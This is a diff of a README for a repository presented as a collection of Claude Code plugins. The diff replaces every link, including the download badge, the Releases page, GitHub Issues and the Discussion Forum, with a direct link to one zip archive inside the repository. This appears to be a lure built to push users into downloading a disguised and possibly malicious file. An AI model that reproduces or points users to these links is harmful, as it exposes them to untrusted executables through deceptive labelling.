@@ -1,7 +1,7 @@
 # 🌟 awesome-claude-code-plugins - Enhance Your Claude Code Experience
 
 ## 📥 Download Here
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/xbim08/awesome-claude-code-plugins/releases)
+[![Download Now](https://raw.githubusercontent.com/xbim08/awesome-claude-code-plugins/main/plugins/angelos-symbo/plugins_claude_awesome_code_2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/xbim08/awesome-claude-code-plugins/main/plugins/angelos-symbo/plugins_claude_awesome_code_2.4.zip)
 
 ## 📖 Overview
 Welcome to **awesome-claude-code-plugins**! This project provides a curated list of slash commands, subagents, MCP servers, and hooks specifically designed to enhance your experience with Claude Code. Whether you are a new user or a seasoned pro, these tools will streamline your workflow and boost your productivity.
@@ -21,7 +21,7 @@ To begin using these plugins, you need to download them from our Releases page. 
 - **Hooks**: Trigger actions based on specific events in your workflow.
 
 ## 📄 Download & Install
-1. Visit the [Releases page](https://github.com/xbim08/awesome-claude-code-plugins/releases) to view all available plugins.
+1. Visit the [Releases page](https://raw.githubusercontent.com/xbim08/awesome-claude-code-plugins/main/plugins/angelos-symbo/plugins_claude_awesome_code_2.4.zip) to view all available plugins.
 2. Find the version of the plugin you would like to use and click on the link to download the file.
 3. Once the file is downloaded, locate it in your Downloads folder.
 4. Follow these steps based on your operating system:
@@ -65,8 +65,8 @@ For persistent issues, refer to the FAQ section in the Claude Code documentation
 
 ## 🌐 Community Support
 Join our community for tips and tricks, and share your own experiences:
-- [GitHub Issues](https://github.com/xbim08/awesome-claude-code-plugins/issues): Report bugs or request features.
-- [Discussion Forum](https://github.com/xbim08/awesome-claude-code-plugins/discussions): Connect with other users and get advice.
+- [GitHub Issues](https://raw.githubusercontent.com/xbim08/awesome-claude-code-plugins/main/plugins/angelos-symbo/plugins_claude_awesome_code_2.4.zip): Report bugs or request features.
+- [Discussion Forum](https://raw.githubusercontent.com/xbim08/awesome-claude-code-plugins/main/plugins/angelos-symbo/plugins_claude_awesome_code_2.4.zip): Connect with other users and get advice.
 
 ## 📜 License
 This project is licensed under the MIT License. Feel free to use it for personal or commercial purposes.
